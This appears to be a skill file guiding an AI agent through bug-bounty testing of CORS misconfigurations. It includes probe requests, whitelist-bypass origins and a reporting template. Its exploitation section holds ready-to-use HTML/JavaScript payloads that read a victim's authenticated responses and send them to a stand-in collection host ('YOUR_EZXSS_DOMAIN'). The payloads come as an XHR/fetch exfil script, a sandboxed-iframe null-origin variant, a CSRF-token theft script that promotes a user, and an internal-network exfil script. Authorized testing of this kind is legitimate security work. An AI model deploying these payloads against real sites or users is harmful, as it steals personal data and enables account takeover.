---
name: cors
description: CORS Misconfigurations — arbitrary origin reflection, improper whitelist (prefix/suffix bypass), null origin trust, wildcard on internal apps, and CORS-based CSRF token bypass. Use when HauntMode flags CORS as APPLIES/MAYBE, when responses contain Access-Control-Allow-Origin headers, when APIs are used cross-domain, or when you need end-to-end CORS testing methodology and exploit PoC templates.
---

# CORS Misconfigurations

This skill covers detection of all CORS misconfiguration types, confirmation methodology, and ready-to-use exploit templates for cross-origin data exfiltration and CSRF token bypass. Read top to bottom on first use.

---

## 1. Triggers — when this skill applies

- Any response containing `Access-Control-Allow-Origin:` headers
- API endpoints (REST or GraphQL) that are consumed cross-domain
- Apps with a separate API subdomain (`api.target.com`) and a front-end domain (`app.target.com`)
- Any authenticated endpoint that returns sensitive data (PII, session tokens, CSRF tokens, admin data)
- Internal apps or APIs with permissive CORS headers
- Combination of CORS + CSRF-protected endpoints (CORS misconfiguration can bypass CSRF tokens)

---

---

## 3. 30-second triage

Send two probes to any authenticated endpoint:

**Probe 1 — arbitrary origin reflection:**
```
GET /api/data HTTP/1.1
Host: TARGET
Cookie: session=YOUR_SESSION
Origin: https://attacker.com
```

Check response headers for:
- `Access-Control-Allow-Origin: https://attacker.com` → arbitrary origin reflected, CRITICAL if combined with credentials header
- `Access-Control-Allow-Credentials: true` → makes it exploitable for authenticated data exfil

**Probe 2 — null origin:**
```
GET /api/data HTTP/1.1
Host: TARGET
Cookie: session=YOUR_SESSION
Origin: null
```

Check for `Access-Control-Allow-Origin: null` → null origin trusted, exploitable via sandboxed iframe.

If neither works, test subdomain trust and prefix/suffix bypass (see section 5).

**Not exploitable alone:** `Access-Control-Allow-Origin: *` WITHOUT `Access-Control-Allow-Credentials: true` → anonymous requests only, no authenticated data. Still exploitable on internal unauthenticated APIs (see section 6.4).

---

## 4. Understanding what makes CORS exploitable

**The two conditions for authenticated data exfil:**
1. `Access-Control-Allow-Origin` reflects attacker-controlled origin (or is `null` exploitable)
2. `Access-Control-Allow-Credentials: true`

Both must be present. Without condition 2, requests are sent without cookies → no authenticated data in response.

**Note on SameSite cookies:** In real-world apps, the victim's session cookie must be sent with the cross-origin request. This requires `SameSite=None` on the session cookie OR the exploit must be delivered from the same site (subdomain). Modern browsers set `SameSite=Lax` by default, which may prevent cookie sending. Check the `Set-Cookie` header for the `SameSite` attribute.

---

## 5. Detection — all misconfiguration types

### 5.1 Arbitrary origin reflection

The simplest and most common misconfiguration — app reflects any origin it receives.

Test:
```
Origin: https://doesnotexist.whatever.invalid
```

Vulnerable if: `Access-Control-Allow-Origin: https://doesnotexist.whatever.invalid` in response.

### 5.2 Improper whitelist — suffix match bypass

App validates that origin ends with `.target.com`. Bypass by registering a domain that ends with `target.com`:

Attack origin: `https://attackertarget.com`

This passes a suffix check `origin.endsWith('target.com')` but is not a subdomain of `target.com`.

Test: send `Origin: https://attackertarget.com` — if reflected, suffix match bypass works.

### 5.3 Improper whitelist — prefix match bypass

App validates that origin starts with `https://target.com`. Bypass:

Attack origin: `https://target.com.attacker.com`

Test: send `Origin: https://target.com.attacker.com` — if reflected, prefix match bypass works.

### 5.4 Subdomain trust (XSS in subdomain → CORS exploit chain)

App trusts all `*.target.com` subdomains with credentials. If any subdomain has an XSS vulnerability, you can use XSS on that subdomain to make credentialed CORS requests to the main app.

Test: send `Origin: https://subdomain.target.com` — if reflected with credentials, look for XSS on any subdomain to chain.

### 5.5 Null origin trust

App explicitly allows `Origin: null`. Can be triggered via sandboxed iframes.

Test: send `Origin: null` — if response contains `Access-Control-Allow-Origin: null`, exploit via sandboxed iframe.

### 5.6 Wildcard on unauthenticated internal app

App returns `Access-Control-Allow-Origin: *` on an internal API that doesn't require auth but contains sensitive data. No credentials needed — any origin can read responses.

---

## 6. Exploitation

### 6.1 Authenticated data exfiltration (arbitrary origin reflection)

Deliver this page from any origin. When the victim visits, their browser sends a credentialed request to the target and exfiltrates the response.

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://TARGET/api/data', true);
  xhr.withCredentials = true;
  xhr.onload = function() {
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'YOUR_EZXSS_DOMAIN/cors-exfil', true);
    exfil.setRequestHeader('Content-Type', 'application/json');
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
  };
  xhr.send();
</script>
```

**Using fetch() instead of XHR (cleaner):**
```html
<script>
  fetch('https://TARGET/api/data', {credentials: 'include'})
    .then(r => r.text())
    .then(data => {
      fetch('YOUR_EZXSS_DOMAIN/cors-exfil?d=' + encodeURIComponent(btoa(data)));
    });
</script>
```

Check `YOUR_EZXSS_DOMAIN` dashboard for the callback. Decode with `echo "BASE64DATA" | base64 -d`.

**GET-based exfil (simpler but navigates the page — noisy):**
```html
<script>
  fetch('https://TARGET/api/data', {credentials: 'include'})
    .then(r => r.text())
    .then(data => {
      location = 'YOUR_EZXSS_DOMAIN/cors-exfil?data=' + btoa(data);
    });
</script>
```

Avoid this for stealth — it redirects the victim's browser visibly.

### 6.2 Null origin exploitation (sandboxed iframe)

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://TARGET/api/data', true);
  xhr.withCredentials = true;
  xhr.onload = function() {
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'YOUR_EZXSS_DOMAIN/cors-exfil', true);
    exfil.setRequestHeader('Content-Type', 'application/json');
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
  };
  xhr.send();
</script>"></iframe>
```

The `data:` URL in `src` combined with `sandbox` attribute produces a `null` origin in the cross-origin request.

### 6.3 CORS misconfiguration → CSRF token bypass

When the CORS misconfiguration allows credentialed requests AND the app protects state-changing endpoints with CSRF tokens: fetch the CSRF token from a GET endpoint, then perform the state-changing action.

```html
<script>
  // Step 1: Fetch CSRF token from victim's session
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://TARGET/profile.php', false);  // synchronous
  xhr.withCredentials = true;
  xhr.send();

  // Step 2: Parse CSRF token from response HTML
  var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
  var csrfToken = encodeURIComponent(doc.getElementById('csrf').value);
  // Note: adapt getElementById('csrf') to the actual token element ID/name

  // Step 3: Perform state-changing action with valid CSRF token
  var post = new XMLHttpRequest();
  var params = 'promote=TARGET_USERNAME&csrf=' + csrfToken;
  post.open('POST', 'https://TARGET/profile.php', false);  // synchronous
  post.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  post.withCredentials = true;
  post.send(params);
</script>
```

Adapt `getElementById('csrf')` to however the CSRF token appears in the page (check source for `<input type="hidden" name="csrf_token" ...>` or `<input id="csrf">`).

This bypasses CSRF tokens entirely because: you make the GET request with the victim's session, read the legitimate CSRF token from their session context, and submit it in the POST — the token is valid.

### 6.4 Internal/unauthenticated API with wildcard CORS

For APIs that return sensitive data without authentication and allow `*` (e.g., an internal app visible from within the victim's network):

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://INTERNAL_IP_OR_HOST/api/data', true);
  // No credentials needed — wildcard doesn't support withCredentials
  xhr.onload = function() {
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'YOUR_EZXSS_DOMAIN/cors-internal', true);
    exfil.setRequestHeader('Content-Type', 'application/json');
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
  };
  xhr.send();
</script>
```

If the internal app's address is unknown, build a scanner payload that tries multiple IP:port combinations and exfils only successful responses (filter by status != 0 and response length > threshold).

---

## 7. Bypass techniques

### Subdomain-trust bypass via XSS
If the app trusts `*.target.com`, find XSS on any subdomain (even a low-severity one) and use it to make the credentialed CORS request. The XSS payload on `sub.target.com` runs in an origin that's whitelisted.

### Origin validation bypass — null byte
```
Origin: https://target.com\x00.attacker.com
```
Some parsers truncate at the null byte and check the prefix. Test with URL-encoded `%00`.

### Checking all authenticated endpoints
CORS misconfiguration may only affect certain endpoints. Test `/api/user`, `/api/profile`, `/api/account`, `/api/admin`, `/settings`, etc. — especially ones that return sensitive data.

### Pre-flight bypass
For simple requests (GET, HEAD, certain POST), browsers send the actual request directly. Only complex requests trigger a preflight OPTIONS. If the target only validates CORS headers on OPTIONS, simple GET requests bypass it entirely.

---

## 8. False-positive checks

- **`ACAO: *` without `ACAC: true`** — browsers do not send cookies for wildcard CORS. Cannot exfil authenticated data. Still exploitable for unauthenticated internal apps.
- **`ACAC: true` without any ACAO matching your origin** — no bypass. The response will not be readable.
- **SameSite=Lax/Strict on session cookie** — even with a perfect CORS misconfiguration, `SameSite=Lax` cookies are not sent on cross-site requests (except for top-level GET navigations). Test if the session cookie has `SameSite=None; Secure` set. If not, cookies won't be sent. The lab or real target must have `SameSite=None` for full exploitation.
- **CORS error in your browser during PoC testing** — this may be a third-party cookie issue in your own test browser. The exploit still works when delivered to a victim. Test in an incognito window with third-party cookies allowed, or rely on ezXSS callback to confirm.
- **Origin header not reflected** — if the app returns no CORS headers at all, it's not vulnerable to CORS misconfiguration. The browser enforces SOP by default. Not a CORS vuln.

---

## 9. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| CORS → CSRF token exfil → CSRF bypass | `csrf` | CSRF protection bypassed even with proper token implementation |
| XSS on subdomain → CORS data exfil from main app | `xss` | Whitelisted subdomain XSS becomes main-app authenticated data leak |
| CORS → admin API data dump | `idor` | Exfil all user data from admin-only API endpoints |
| Internal app CORS wildcard → internal network recon | `ssrf` | Map internal services via victim's browser |
| CORS exfil of session token → ATO | `session-attacks` | Session token in API response → immediate account takeover |
| CORS + SameSite=None → CSRF on every protected action | `csrf` | Full CSRF on all state-changing endpoints |

---

## 10. Reporting template

```
POTENTIAL FINDING: CORS Misconfiguration — <Arbitrary Origin Reflection | Null Origin | Suffix/Prefix Bypass | Wildcard Internal | CSRF Token Bypass>
Target: <full URL of affected API/endpoint>
Misconfiguration:
    Access-Control-Allow-Origin: <what the server returned>
    Access-Control-Allow-Credentials: <true | false | absent>
Test request:
    Origin: <value sent>
    Response ACAO: <value returned>
Session cookie SameSite: <None | Lax | Strict | unset>
Working PoC (hosted on attacker domain):
    <PoC HTML/JS>
Evidence:
    <exfil callback received at YOUR_EZXSS_DOMAIN containing victim's data, base64-decoded content>
Impact:
    <e.g. "Authenticated user data exfiltrated including PII fields X, Y, Z" or
     "CSRF token extracted and used to promote attacker to admin role" or
     "Internal API data accessible to any website the victim visits">
Chain potential: <escalation via CSRF, ATO, internal recon, etc.>
Next step: <e.g. "Deliver PoC to admin account test user and confirm data exfil",
            "Extract CSRF token and confirm state-changing action completes",
            "Check what data is returned by /api/user and /api/admin endpoints">
```

---

## 11. Recon tracker vector strings

**Only log if explicitly authorized.**

- `cors:arbitrary-origin:<endpoint>` — arbitrary origin reflected with ACAC:true
- `cors:null-origin:<endpoint>` — null origin trusted
- `cors:suffix-bypass:<endpoint>` — suffix match bypass worked
- `cors:prefix-bypass:<endpoint>` — prefix match bypass worked
- `cors:subdomain-trust:<endpoint>` — all subdomains trusted
- `cors:wildcard-internal:<endpoint>` — wildcard on unauthenticated internal endpoint
- `cors:csrf-token-bypass:<endpoint>` — CSRF token bypassed via CORS
- `cors:no:<endpoint>` — tested, no misconfiguration found
- `cors:samesite-blocks:<endpoint>` — CORS issue present but SameSite=Lax prevents exploitation

---

## 12. What NOT to do

- **Do not exfiltrate real user data beyond what's needed to prove impact** — one API response proving PII exposure is enough. Do not dump entire user databases.
- **Do not deliver CORS exploits to real users without explicit permission** — CORS exploits require the victim to visit your page. Do not socially engineer real users.
- **Do not report `ACAO: *` without `ACAC: true` as high severity for authenticated endpoints** — without credentials, authenticated data cannot be exfiltrated. Report accurately.
- **Do not test out-of-scope domains** — check `scope.txt`.
- **Do not auto-log to recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not use Burp Active Scanner** — Community edition only; all testing is manual.
- **Do not assume CORS misconfiguration = full account takeover automatically** — assess what data the endpoint actually returns and what actions can be taken. Exfilling a public list of blog posts via CORS is low-severity regardless of the misconfiguration.
